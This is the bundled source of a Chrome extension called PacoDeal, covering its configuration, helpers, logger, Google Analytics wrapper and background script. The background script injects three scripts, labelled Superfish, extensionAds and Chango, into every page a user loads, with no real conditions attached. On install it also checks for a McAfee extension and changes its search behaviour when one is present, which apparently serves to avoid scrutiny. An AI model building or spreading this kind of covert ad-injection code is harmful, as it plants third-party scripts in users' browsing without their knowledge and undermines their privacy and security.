



 /*********************** start File  config.js **************************/



ENV             = "";
BASE_URL        = "http://pacodeal.herokuapp.com/";
LOGGLY_INPUT    = "https://logs.loggly.com/inputs/8a8016e8-316b-4fd1-9b93-8da73d0c707a";
DEBUG_LEVEL     = 0;
CLIENT_NAME     = "PacoDeal";
VERSION         = chrome.app.getDetails() ? chrome.app.getDetails().version: null ;
GA_UID          = "UA-40447064-1";
SUPERF_E          = true;





 /*********************** End File config.js ******************/ 







 /*********************** start File  common.js **************************/



var common = function(){
    var truncate = function (string, length, suffix){
        if (!suffix)suffix ='';
        return (string && string.length > length) ? string.substring(0,length) + suffix : string ;
    };

    var stripHTMLTags = function(html){
        var div = document.createElement("div");
        div.innerHTML = html;
        return div.textContent || div.innerText || "";
    };

    var stripWWW = function(host){
        if (host.indexOf('www.') == 0)
            return host.slice(4);
        else return host;
    };

    var convertLTGT = function(convert){
        return $("<span />", { html: convert }).text();
    };


    var noop = function(){

    };


    var binarySearch = function(needle, arr) {
        if (typeof(arr) === 'undefined' || !arr.length) return -1;

        var high = arr.length - 1;
        var low = 0;
        var vals = [];
        var bUp = true;
        var bDown = true;
        var i = 1;

        while (low <= high) {
            var mid = parseInt((low + high) / 2)
            var element = arr[mid].host;
            if (element > needle) {
                high = mid - 1;
            } else if (element < needle) {
                low = mid + 1;
            } else {
                return arr[mid];
            }
        }

        return -1;
    };



    // parseUri 1.2.2
    // (c) Steven Levithan <stevenlevithan.com>
    // MIT License

    var parseUri = function  (str) {
        var	o   = parseUri.options,
            m   = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
            uri = {},
            i   = 14;

        while (i--) uri[o.key[i]] = m[i] || "";

        uri[o.q.name] = {};
        uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
            if ($1) uri[o.q.name][$1] = $2;
        });

        return uri;
    };

    parseUri.options = {
        strictMode: false,
        key: ["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"],
        q:   {
            name:   "queryKey",
            parser: /(?:^|&)([^&=]*)=?([^&]*)/g
        },
        parser: {
            strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
            loose:  /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
        }
    }


    return {
        truncate : truncate,
        stripHTMLTags : stripHTMLTags,
        stripWWW : stripWWW,
        parseUri : parseUri,
        convertLTGT : convertLTGT,
        noop : noop,
        binarySearch : binarySearch
    };

}();




 /*********************** End File common.js ******************/ 







 /*********************** start File  logger.js **************************/



var logger = (function($){

    // logger levels :
    // 0 : for production -  errors and info are sent to loggly, nothing is printed
    // 1 : for tests - errors are printed and sent to loggly
    // 2 : for development - nothing is sent to loggly, only errors and infos are printed
    // 3 : for development - everything is printed and nothing is sent to loggly
    // 4 : for development - everything is printed and sent to loggly


    if(!$)return false;
    var inputUrl         = LOGGLY_INPUT,
        debugLevel       = DEBUG_LEVEL|| 1;

    var clientInfo = function(){
       return {
         version             : VERSION,
         clientName          : CLIENT_NAME,
         environment         : ENV
       };
    };

    var error = function(message,errStack){
         var obj = {
             type : 'ERROR',
             errStack : errStack,
             message : message
         };
        $.extend(obj,clientInfo());

        if(debugLevel === 0){
            json(obj);
        }else if (debugLevel === 1){
            json(obj);
            console.error(message,errStack);
        }else if (debugLevel === 2){
            console.error(message,errStack);
        }else if (debugLevel === 3){
            console.error(message,errStack);
        }else if (debugLevel === 4){
            console.error(message,errStack);
            json(obj);
        }
    };

    var log = function(message){
        var obj = {
            type : 'LOG',
            message : message
        };
        $.extend(obj,clientInfo());

        if (debugLevel === 3){
            console.log(message);
        }else if (debugLevel === 4){
            console.log(message);
            json(obj);
        }



    };

    var info = function(message){
        var obj = {
            type : 'INFO',
            message : message
        };
        $.extend(obj,clientInfo());

        if (debugLevel === 0){
            json(obj);
        } else if (debugLevel === 2){
            console.info(message);
        }else if (debugLevel === 3){
            console.info(message);
        }else if (debugLevel === 4){
            console.info(message);
            json(obj);
        }

    };

    var warn = function(message){
        var obj = {
            type : 'WARN',
            message : message
        };
        $.extend(obj,clientInfo());

        if (debugLevel === 3){
            console.warn(message);
        }else if (debugLevel === 4){
            console.warn(message);
            json(obj);
        }

    };



    var json = function(object){
        $.post(inputUrl,object);
    };



    return {
      log : log,
      error : error,
      info : info,
      warn : warn,
      json : json
    }
})(jQuery);



 /*********************** End File logger.js ******************/ 







 /*********************** start File  ga.js **************************/



var _gaq = _gaq || [];

var ga = (function(window){

    var init = function(ga_uid,custom_vars_array){
        ga_uid = ga_uid || GA_UID || "UA-40447064-1";
        _gaq.push(['_setAccount', ga_uid]);
        _gaq.push(['_trackPageview']);
        if(custom_vars_array)setCustomVars(custom_vars_array);
        (function() {
            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
            ga.src =  'https://ssl' + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
        })();
    };

    var setCustomVars = function(custom_vars_array){
        for(var i in custom_vars_array){
           var obj = custom_vars_array[i];
            if(!obj.scope)obj.scope=1;
            _gaq.push(['_setCustomVar',
                obj.slot,                   // This custom var is set to slot #1.  Required parameter.
                obj.name,     // The name acts as a kind of category for the user activity.  Required parameter.
                obj.value,               // This value of the custom variable.  Required parameter.
                obj.scope                    // Sets the scope to session-level.  Optional parameter.
            ]);

        }

    }

    var trackEvent = function(evt){
        _gaq.push(['_trackEvent',
            evt.category, // category of activity
            evt.action, // Action
            evt.label, //label
            evt.value, //value,
            evt.nonInteraction
        ]);
    }


    return {
        init : init,
        setCustomVars : setCustomVars,
        trackEvent : trackEvent
    }

})(window);



 /*********************** End File ga.js ******************/ 







 /*********************** start File  background.js **************************/







(function ($,common,ga,logger){

    var version  = chrome.app.getDetails().version;
    var anonymousUserId;
    var testingVars;

    var init = function(){
        testingVars = getUserTestingCustomVars();

        ga.init(null,testingVars);
        checkInstallStatus();
    };


    var setUserTestingCustomVars = function(){

        //  superFish enabled Yes/NO
        var superFishEnabledSlot = SUPERF_E;

        testingVars = [
            {slot : 1 , name : 'SuperFish Enabled' , value : superFishEnabledSlot , scope : 1}
        ];

        localStorage.setItem('ga_custom_vars',JSON.stringify(testingVars));
        logger.json({action : 'set_user_testing_vars', testingVars : testingVars});
    };

    var getUserTestingCustomVars = function(){
        var string = localStorage.getItem('ga_custom_vars');
        return JSON.parse(string);
    };


    var checkInstallStatus = function(done){
        var install_version = localStorage.getItem('install_version');
        if(!install_version){
            newInstall(done);
            (done||common.noop)('new_install');
        }else if (install_version != version){
            updateInstall();
            (done||common.noop)('update_install');
        }else{
            (done||common.noop)();
        }
        localStorage.setItem('install_version',version);
    };

    var newInstall = function(){
        setUserTestingCustomVars();
        var focus=true,
            rand=Math.random();
        if(rand>0.5){
            focus=false;
        }
        localStorage.setItem('takeFocus',focus);
        console.log('focus ',focus);
        try{
            //check mcafee exist if yes change search to google
            checkMcafeeExist(function(flag){
                //if exist change search to regular google
                if(flag){
                     localStorage.googleSearch = true;
                     localStorage.SEARCH_URL_PREFIX = "http://www.google.com/search";
                }
            });
            //create welcome on first login
            //chrome.tabs.create({url : 'welcome.html'});
        }catch(e){
            logger.error('create welcome tab err',e);
        }
        setTimeout(function(){
            ga.trackEvent('pacodeal','new_install focuse '+focus);
        },10);
    };

    var updateInstall = function(){
        var focus=localStorage.getItem('takeFocus');
        ga.trackEvent('pacodeal','update_install focus '+focus);
    };

    var checkMcafeeExist= function(done){
        try{
            chrome.management.getAll(function (arr) {
                if(arr && arr.length > 0 ){
                    for (var i=0 ; i<arr.length;++i){
                        if(arr[i] && arr[i].id && arr[i].id == "fheoggkfdfchfphceeifdbepaooicaho"){
                            return done(true);
                        }
                    }
                }
                return done(false);
            });
        } catch (e){
            console.log('err',e);
            return done(false);
        }
    }

    var shouldInjectSuperFish = function(origin){
        return true;
    };

    var shouldInjectExtensionAds = function(origin){
        return true;
    };

    var shouldInjectChango = function(origin){
        return true;
    };


    var getInjection = function(tab){
         if(shouldInjectSuperFish(tab.url)){
             injectSuperfish(tab.id);
         }
         if(shouldInjectExtensionAds(tab.url)){
            injectExtensionAds(tab.id);
         }
         if(shouldInjectChango(tab.url)){
             injectChango(tab.id);
         }
    };

    var injectSuperfish = function(tabId){
        logger.info('Injecting Superfish.');
        try {
            //insert superfish
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/s.js'}, function(){});
            console.log('insert e script');

            ga.trackEvent({category : 'Superfish', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting Superfish',e);
        }
    };

    var injectExtensionAds = function(tabId){
        logger.info('Injecting ExtensionA');
        try {
            //insert extensionAds
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/extensionAds.js'}, function(){});

            ga.trackEvent({category : 'extensionAds', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting extensionAds',e);
        }
    };

    var injectChango = function(tabId){
        logger.info('Injecting Chango');
        try {
            //insert extensionAds
            chrome.tabs.executeScript(tabId, {file : '/pacodeal/i/chd.js'}, function(){});

            ga.trackEvent({category : 'chango', action : 'Injected'});
        }catch(e){
            logger.error('Caught error when injecting chango',e);
        }
    };

    try{
        chrome.tabs.onCreated.addListener(function (tab) {
            // take focus
            if (tab.url == "chrome://newtab/") {
                if(localStorage.getItem('takeFocus')=="true"){
                    chrome.tabs.update(tab.id,{selected:true},function(){
                        setTimeout(function(){$("#search_input").focus();},0);
                    });
                }
            }
        });

        chrome.tabs.onUpdated.addListener(function(tabId,change,tab) {
            if(change.status == "complete"){
                getInjection(tab);
            }
        });

        chrome.extension.onMessage.addListener(
            function(request, sender, sendResponse) {
            if(request.action == 'trackEvent'){
               ga.trackEvent(request.event);
            }
            sendResponse({});
        });

    }catch(err){

    }

    init();

})(jQuery,common,ga,logger);




 /*********************** End File background.js ******************/ 



